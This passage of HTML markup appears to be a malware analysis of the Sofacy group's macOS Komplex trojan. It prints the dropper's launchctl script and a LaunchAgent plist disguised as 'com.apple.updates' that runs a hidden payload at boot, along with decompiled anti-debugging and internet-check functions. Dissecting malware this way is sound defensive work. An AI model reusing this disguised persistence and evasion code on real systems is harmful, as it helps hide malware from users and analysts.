					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9b5c8a5542861047962-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b5c8a5542861047962-2">2</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9b5c8a5542861047962-1"><span class="crayon-p">#!/bin/sh</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b5c8a5542861047962-2"><span class="crayon-e">launchctl </span><span class="crayon-v">load</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">w</span><span class="crayon-h"> </span><span class="crayon-o">~</span><span class="crayon-o">/</span><span class="crayon-v">Library</span><span class="crayon-o">/</span><span class="crayon-v">LaunchAgents</span><span class="crayon-o">/</span><span class="crayon-v">com</span><span class="crayon-sy">.</span><span class="crayon-v">apple</span><span class="crayon-sy">.</span><span class="crayon-v">updates</span><span class="crayon-sy">.</span><span class="crayon-v">plist</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0002 seconds] -->
<p></p>
<p style="text-align: center;"><em>Figure </em><em>4</em><em> Contents of the start.sh shell script that calls launchctl</em></p>
<p>The ‘start.sh’ script loads ‘com.apple.updates.plist’, which sets the properties of the Komplex payload that is executed from “/Users/Shared/.local/kextd” at system start up courtesy of the “RunAtLoad” parameter.  Figure 5 shows the contents of the ‘com.apple.updates.plist’ file loaded into ‘launchd’.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9b5c8a5544465436416" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-mixed-highlight" title="Contains Mixed Languages"></span><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" 
"http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;
&lt;plist version="1.0"&gt;
&lt;dict&gt;
	&lt;key&gt;Label&lt;/key&gt;
	&lt;string&gt;com.apple.updates&lt;/string&gt;
	&lt;key&gt;ProgramArguments&lt;/key&gt;
	&lt;array&gt;
		&lt;string&gt;/Users/Shared/.local/kextd&lt;/string&gt;
	&lt;/array&gt;
	&lt;key&gt;KeepAlive&lt;/key&gt;
	&lt;false/&gt;
	&lt;key&gt;RunAtLoad&lt;/key&gt;
	&lt;true/&gt;
	&lt;key&gt;StandardErrorPath&lt;/key&gt;
	&lt;string&gt;/dev/null&lt;/string&gt;
	&lt;key&gt;StandardOutPath&lt;/key&gt;
	&lt;string&gt;/dev/null&lt;/string&gt;
&lt;/dict&gt;
&lt;/plist&gt;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9b5c8a5544465436416-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b5c8a5544465436416-2">2</div><div class="crayon-num" data-line="crayon-60a9b5c8a5544465436416-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b5c8a5544465436416-4">4</div><div class="crayon-num" data-line="crayon-60a9b5c8a5544465436416-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b5c8a5544465436416-6">6</div><div class="crayon-num" data-line="crayon-60a9b5c8a5544465436416-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b5c8a5544465436416-8">8</div><div class="crayon-num" data-line="crayon-60a9b5c8a5544465436416-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b5c8a5544465436416-10">10</div><div class="crayon-num" data-line="crayon-60a9b5c8a5544465436416-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b5c8a5544465436416-12">12</div><div class="crayon-num" data-line="crayon-60a9b5c8a5544465436416-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b5c8a5544465436416-14">14</div><div class="crayon-num" data-line="crayon-60a9b5c8a5544465436416-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b5c8a5544465436416-16">16</div><div class="crayon-num" data-line="crayon-60a9b5c8a5544465436416-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b5c8a5544465436416-18">18</div><div class="crayon-num" data-line="crayon-60a9b5c8a5544465436416-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b5c8a5544465436416-20">20</div><div class="crayon-num" data-line="crayon-60a9b5c8a5544465436416-21">21</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9b5c8a5544465436416-1"><span class="crayon-ta">&lt;?</span><span class="crayon-e">xml </span><span class="crayon-i">version</span><span class="crayon-o">=</span><span class="crayon-s">"1.0"</span><span class="crayon-h"> </span><span class="crayon-i">encoding</span><span class="crayon-o">=</span><span class="crayon-s">"UTF-8"</span><span class="crayon-ta">?&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b5c8a5544465436416-2"><span class="crayon-o">&lt;</span><span class="crayon-o">!</span><span class="crayon-e">DOCTYPE </span><span class="crayon-e">plist </span><span class="crayon-m">PUBLIC</span><span class="crayon-h"> </span><span class="crayon-s">"-//Apple//DTD PLIST 1.0//EN"</span><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-60a9b5c8a5544465436416-3"><span class="crayon-s">"http://www.apple.com/DTDs/PropertyList-1.0.dtd"</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b5c8a5544465436416-4"><span class="crayon-o">&lt;</span><span class="crayon-e">plist </span><span class="crayon-v">version</span><span class="crayon-o">=</span><span class="crayon-s">"1.0"</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-60a9b5c8a5544465436416-5"><span class="crayon-o">&lt;</span><span class="crayon-v">dict</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b5c8a5544465436416-6"><span class="crayon-h">	</span><span class="crayon-o">&lt;</span><span class="crayon-v">key</span><span class="crayon-o">&gt;</span><span class="crayon-v">Label</span><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-v">key</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-60a9b5c8a5544465436416-7"><span class="crayon-h">	</span><span class="crayon-o">&lt;</span><span class="crayon-t">string</span><span class="crayon-o">&gt;</span><span class="crayon-v">com</span><span class="crayon-sy">.</span><span class="crayon-v">apple</span><span class="crayon-sy">.</span><span class="crayon-v">updates</span><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-t">string</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b5c8a5544465436416-8"><span class="crayon-h">	</span><span class="crayon-o">&lt;</span><span class="crayon-v">key</span><span class="crayon-o">&gt;</span><span class="crayon-v">ProgramArguments</span><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-v">key</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-60a9b5c8a5544465436416-9"><span class="crayon-h">	</span><span class="crayon-o">&lt;</span><span class="crayon-t">array</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b5c8a5544465436416-10"><span class="crayon-h">		</span><span class="crayon-o">&lt;</span><span class="crayon-t">string</span><span class="crayon-o">&gt;</span><span class="crayon-o">/</span><span class="crayon-v">Users</span><span class="crayon-o">/</span><span class="crayon-v">Shared</span><span class="crayon-o">/</span><span class="crayon-sy">.</span><span class="crayon-v">local</span><span class="crayon-o">/</span><span class="crayon-v">kextd</span><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-t">string</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-60a9b5c8a5544465436416-11"><span class="crayon-h">	</span><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-t">array</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b5c8a5544465436416-12"><span class="crayon-h">	</span><span class="crayon-o">&lt;</span><span class="crayon-v">key</span><span class="crayon-o">&gt;</span><span class="crayon-v">KeepAlive</span><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-v">key</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-60a9b5c8a5544465436416-13"><span class="crayon-h">	</span><span class="crayon-o">&lt;</span><span class="crayon-t">false</span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b5c8a5544465436416-14"><span class="crayon-h">	</span><span class="crayon-o">&lt;</span><span class="crayon-v">key</span><span class="crayon-o">&gt;</span><span class="crayon-v">RunAtLoad</span><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-v">key</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-60a9b5c8a5544465436416-15"><span class="crayon-h">	</span><span class="crayon-o">&lt;</span><span class="crayon-t">true</span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b5c8a5544465436416-16"><span class="crayon-h">	</span><span class="crayon-o">&lt;</span><span class="crayon-v">key</span><span class="crayon-o">&gt;</span><span class="crayon-v">StandardErrorPath</span><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-v">key</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-60a9b5c8a5544465436416-17"><span class="crayon-h">	</span><span class="crayon-o">&lt;</span><span class="crayon-t">string</span><span class="crayon-o">&gt;</span><span class="crayon-o">/</span><span class="crayon-v">dev</span><span class="crayon-o">/</span><span class="crayon-t">null</span><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-t">string</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b5c8a5544465436416-18"><span class="crayon-h">	</span><span class="crayon-o">&lt;</span><span class="crayon-v">key</span><span class="crayon-o">&gt;</span><span class="crayon-v">StandardOutPath</span><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-v">key</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-60a9b5c8a5544465436416-19"><span class="crayon-h">	</span><span class="crayon-o">&lt;</span><span class="crayon-t">string</span><span class="crayon-o">&gt;</span><span class="crayon-o">/</span><span class="crayon-v">dev</span><span class="crayon-o">/</span><span class="crayon-t">null</span><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-t">string</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b5c8a5544465436416-20"><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-v">dict</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-60a9b5c8a5544465436416-21"><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-v">plist</span><span class="crayon-o">&gt;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0019 seconds] -->
<p></p>
<p style="text-align: center;"><em>Figure </em><em>5</em><em> Contents of the com.apple.updates.plist file showing how the dropper achieves persistence</em></p>
<h3>Komplex Payload</h3>
<p>The ultimate purpose of the aforementioned components is to install and execute the Komplex payload. The dropper component saves the payload to "/Users/Shared/.local/kextd" (SHA256: 227b7fe495ad9951aebf0aae3c317c1ac526cdd255953f111341b0b11be3bbc5) and ultimately executes the payload. The payload begins by conducting an anti-debugging check to see if it is being debugged before proceeding with executing its main functionality, which can be seen in the “AmIBeingDebugged” function in Figure 6. The “AmIBeingDebugged” function uses the “sysctl” function to check to see if a specific “P_TRACED” flag is set, which signifies that the process is being debugged. A particularly interesting part of this function is that it is very similar to the function provided by Apple to its developers in a <a href="https://developer.apple.com/library/content/qa/qa1361/_index.html" target="_blank">guide created in 2004 titled “Detecting the Debugger”.</a> This is not the first time the Sofacy group's malware authors have obtained techniques from publicly available sources, as demonstrated in the use of the <a href="http://blog.paloaltonetworks.com/2016/07/unit42-technical-walkthrough-office-test-persistence-method-used-in-recent-sofacy-attacks/" target="_blank">Office Test Persistence Method</a> that they obtained from a <a href="http://www.hexacorn.com/blog/2014/04/16/beyond-good-ol-run-key-part-10/" target="_blank">blog posted in 2014</a>.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9b5c8a5547724858828" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
int AmIBeingDebugged()() {
    var_8 = **__stack_chk_guard;
    getpid();
    if ((((sysctl(0x1, 0x4, var_2A8, 0x288, 0x0, 0x0) == 0x0 ? 0x1 : 0x0) ^ 0x1) &amp; 0x1 
&amp; 0xff) != 0x0) {
            rax = __assert_rtn("AmIBeingDebugged", 
"/Users/user/Desktop/LoaderWinApi/LoaderWinApi/main.mm", 0x21, "junk == 0");
    }
    else {
            var_2C1 = (0x0 &amp; 0x800) != 0x0 ? 0x1 : 0x0;
            if (**__stack_chk_guard == var_8) {
                    rax = var_2C1 &amp; 0x1 &amp; 0xff;
            }
            else {
                    rax = __stack_chk_fail();
            }
    }
    return rax;
}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9b5c8a5547724858828-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b5c8a5547724858828-2">2</div><div class="crayon-num" data-line="crayon-60a9b5c8a5547724858828-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b5c8a5547724858828-4">4</div><div class="crayon-num" data-line="crayon-60a9b5c8a5547724858828-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b5c8a5547724858828-6">6</div><div class="crayon-num" data-line="crayon-60a9b5c8a5547724858828-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b5c8a5547724858828-8">8</div><div class="crayon-num" data-line="crayon-60a9b5c8a5547724858828-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b5c8a5547724858828-10">10</div><div class="crayon-num" data-line="crayon-60a9b5c8a5547724858828-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b5c8a5547724858828-12">12</div><div class="crayon-num" data-line="crayon-60a9b5c8a5547724858828-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b5c8a5547724858828-14">14</div><div class="crayon-num" data-line="crayon-60a9b5c8a5547724858828-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b5c8a5547724858828-16">16</div><div class="crayon-num" data-line="crayon-60a9b5c8a5547724858828-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b5c8a5547724858828-18">18</div><div class="crayon-num" data-line="crayon-60a9b5c8a5547724858828-19">19</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9b5c8a5547724858828-1"><span class="crayon-t">int</span><span class="crayon-h"> </span><span class="crayon-e">AmIBeingDebugged</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b5c8a5547724858828-2"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">var_8</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-o">*</span><span class="crayon-o">*</span><span class="crayon-v">__stack_chk_guard</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60a9b5c8a5547724858828-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">getpid</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b5c8a5547724858828-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-e">sysctl</span><span class="crayon-sy">(</span><span class="crayon-cn">0x1</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">0x4</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">var_2A8</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">0x288</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">0x0</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">0x0</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-cn">0x0</span><span class="crayon-h"> </span><span class="crayon-sy">?</span><span class="crayon-h"> </span><span class="crayon-cn">0x1</span><span class="crayon-h"> </span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">0x0</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">^</span><span class="crayon-h"> </span><span class="crayon-cn">0x1</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-h"> </span><span class="crayon-cn">0x1</span><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-60a9b5c8a5547724858828-5"><span class="crayon-o">&amp;</span><span class="crayon-h"> </span><span class="crayon-cn">0xff</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">!=</span><span class="crayon-h"> </span><span class="crayon-cn">0x0</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b5c8a5547724858828-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">rax</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">__assert_rtn</span><span class="crayon-sy">(</span><span class="crayon-s">"AmIBeingDebugged"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-60a9b5c8a5547724858828-7"><span class="crayon-s">"/Users/user/Desktop/LoaderWinApi/LoaderWinApi/main.mm"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">0x21</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">"junk == 0"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b5c8a5547724858828-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-60a9b5c8a5547724858828-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">else</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b5c8a5547724858828-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">var_2C1</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-cn">0x0</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-h"> </span><span class="crayon-cn">0x800</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">!=</span><span class="crayon-h"> </span><span class="crayon-cn">0x0</span><span class="crayon-h"> </span><span class="crayon-sy">?</span><span class="crayon-h"> </span><span class="crayon-cn">0x1</span><span class="crayon-h"> </span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">0x0</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60a9b5c8a5547724858828-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-o">*</span><span class="crayon-o">*</span><span class="crayon-v">__stack_chk_guard</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-v">var_8</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b5c8a5547724858828-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">rax</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">var_2C1</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-h"> </span><span class="crayon-cn">0x1</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-h"> </span><span class="crayon-cn">0xff</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60a9b5c8a5547724858828-13"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b5c8a5547724858828-14"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">else</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-60a9b5c8a5547724858828-15"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">rax</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">__stack_chk_fail</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b5c8a5547724858828-16"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-60a9b5c8a5547724858828-17"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b5c8a5547724858828-18"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-v">rax</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60a9b5c8a5547724858828-19"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0010 seconds] -->
<p></p>
<p style="text-align: center;"><em>Figure </em><em>6</em><em> The AmIBeingDebugged function used as an anti-analysis technique</em></p>
<p>After determining that it is not running in a debugger, the payload performs an anti-analysis/sandbox check by issuing a GET request to Google, to check for Internet connectivity. The payload will sleep until it receives a response from the HTTP requests to Google, which means Komplex will only communicate to its C2 servers in Internet enabled environments. Figure 7 shows the “connectedToInternet” function that confirms whether the payload is able to communicate with “http://www.google.com” before carrying out its functionality.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9b5c8a5549560011110" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
int connectedToInternet()() {
    if ([NSData dataWithContentsOfURL:[NSURL 
URLWithString:@"http://www.google.com"]] != 0x0) {
            var_1 = 0x1;
    }
    else {
            var_1 = 0x0;
    }
    rax = var_1 &amp; 0x1 &amp; 0xff;
    return rax;
}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9b5c8a5549560011110-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b5c8a5549560011110-2">2</div><div class="crayon-num" data-line="crayon-60a9b5c8a5549560011110-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b5c8a5549560011110-4">4</div><div class="crayon-num" data-line="crayon-60a9b5c8a5549560011110-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b5c8a5549560011110-6">6</div><div class="crayon-num" data-line="crayon-60a9b5c8a5549560011110-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b5c8a5549560011110-8">8</div><div class="crayon-num" data-line="crayon-60a9b5c8a5549560011110-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b5c8a5549560011110-10">10</div><div class="crayon-num" data-line="crayon-60a9b5c8a5549560011110-11">11</div></div>
				</td>
